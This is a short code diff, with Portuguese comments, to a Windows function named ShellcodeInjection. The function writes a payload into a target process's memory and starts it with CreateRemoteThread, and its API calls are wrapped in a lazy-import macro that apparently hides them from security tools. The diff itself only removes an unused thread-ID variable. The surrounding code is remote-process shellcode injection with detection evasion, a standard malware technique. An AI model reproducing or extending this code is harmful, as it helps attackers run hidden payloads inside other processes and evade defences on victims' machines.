@@ -9,8 +9,6 @@ BOOL ShellcodeInjection( _In_ DWORD PID, _In_ PBYTE Payload, _In_ SIZE_T Payload
 
     // Variáveis para injeção de código
     BOOL result = TRUE;
-    DWORD TID = 0;
-    DWORD OldProtect = 0;
     HANDLE hProcess = nullptr;
     HANDLE hThread = nullptr;
     PVOID remoteBuffer = nullptr;
@@ -36,7 +34,7 @@ BOOL ShellcodeInjection( _In_ DWORD PID, _In_ PBYTE Payload, _In_ SIZE_T Payload
     LI_FN(WriteProcessMemory)(hProcess, remoteBuffer, Payload, PayloadSize, nullptr);
 
     // Criando uma thread remota para executar o shellcode
-    hThread = LI_FN(CreateRemoteThread)(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, &TID);
+    hThread = LI_FN(CreateRemoteThread)(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
     if (hThread == nullptr) {
         print_error("CreateRemoteThread");
         result = FALSE; goto CLEANUP;
